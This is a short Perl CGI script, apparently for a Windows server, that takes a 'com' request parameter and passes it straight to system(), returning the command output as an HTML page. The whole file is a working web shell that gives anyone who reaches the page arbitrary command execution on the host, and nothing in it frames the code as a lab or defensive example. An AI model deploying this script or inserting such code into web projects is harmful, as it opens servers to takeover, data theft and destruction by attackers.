#!C:/Strawberry/perl/bin/perl

use strict;
use warnings;
use CGI qw(:standard);

print "Content-type: text/html\r\n\r\n";

my $cmd = param('com');

print "<html><body>";
print "<h3>Command Output</h3>";
print "<pre>";

if ($cmd) {
    system($cmd);
} else {
    print "No command entered";
}

print "</pre>";
print "</body></html>";

exit(0);
